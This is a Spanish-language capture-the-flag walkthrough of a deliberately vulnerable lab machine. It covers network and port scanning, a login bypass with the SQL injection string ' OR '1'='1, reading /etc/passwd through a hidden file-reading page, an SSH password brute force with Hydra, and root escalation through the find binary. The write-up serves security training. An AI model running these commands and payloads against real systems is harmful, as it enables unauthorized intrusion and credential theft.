# Bocata de Calamares

## 0. HERRAMIENTAS

- SQLi
- Base64
- Binario find

## 1. ENUMERACIÓN

Hacemos una búsqueda de ips en nuestra red

```jsx
sudo arp-scan -I eth0 --localnet
```

![image](https://github.com/user-attachments/assets/ed523711-f4d6-4737-86cd-af8e9c8b1928)


Lanzamos un nmap 

```jsx
sudo nmap -p- -open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 192.168.31.164
```

![image](https://github.com/user-attachments/assets/ae77dde1-eac8-4ef6-b246-a193373987e4)


Vemos los puertos abiertos:

- 22
- 80

Accedemos a la url 

![image](https://github.com/user-attachments/assets/0a169ec1-2625-435c-8458-f5815b161806)


Dentro de “Expertos advierten un nuevo peligro…” vemos una pequeña guía de SQL Injection sqli.php

![image](https://github.com/user-attachments/assets/26f46ee0-814e-471b-8fd9-0a038299227d)


Con gobuster buscamos directorios

```jsx
sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u '[http://192.168.31.164](http://192.168.31.164/)' -x 'php,py,sh,,html,txt,jpg'
```

![image](https://github.com/user-attachments/assets/8638dfde-0ba3-421e-8559-eb09d4e7c86a)


Vemos el directorio login.php y admin.php, la segunda no muestra nada.

## 2. COMPROMISO DEL ENTORNO

Login.php muestra una pantalla de acceso. Probaremos haciendo una SQLi

```
 Usuario: admin
 Contraseña: ' OR '1'='1
```

Accedemos correctamente

![image](https://github.com/user-attachments/assets/5e18f895-534e-40b1-944d-fd11fe018615)


Accedemos al enlace to-do-list que indica

![image](https://github.com/user-attachments/assets/a4b6f943-1d59-4611-a064-5341ef95976d)


En el tercer punto nos está dando una pista 

He creado una nueva página para poder leer los ficheros internos del servidor, cada día soy un mejor programador. Además he codificado su nombre en base64, así nadie podrá dar con ella (lee_archivos).

Hay una pagina en base64 donde podemos meter comandos, seguramente sea lee_archivos

Ciframos 

![image](https://github.com/user-attachments/assets/d89de794-27e6-46a2-97a4-cb5232f5cfb4)


Y efectivamente vemos que existe la página y podemos buscar los usuarios de /etc/passwd

![image](https://github.com/user-attachments/assets/dba9be9f-298c-4d1f-9edd-cd232215c543)


Encontramos al usuario superadministrator, intentaremos encontrar su contraseña con Hydra

```jsx
hydra -l superadministrator -P /usr/share/wordlists/rockyou.txt 192.168.31.164 ssh
```

Nos encuentra la contraseña

![image](https://github.com/user-attachments/assets/97296b38-1a8a-47d0-a396-e6f60e08ce8f)


Accedemos por ssh correctamente

Encontramos la primera flag

![image](https://github.com/user-attachments/assets/a2c4ebfd-fb2f-4424-9a50-7c1e34e254bf)


## 3. ESCALACION DE PRIVILEGIOS

Buscamos binarios que podamos ejecutar

![image](https://github.com/user-attachments/assets/ac24b5a4-f23e-4e0d-91bf-76aadee19616)


En https://gtfobins.github.io/ encontramos el siguiente binario /usr/bin/find

![image](https://github.com/user-attachments/assets/d7b7b7e1-a9f0-4ba9-b45a-29a7969855b9)


Conseguimos la elevación de privilegios y localizar la segunda flag

![image](https://github.com/user-attachments/assets/012adb76-c433-4040-84c1-58e23aa70655)
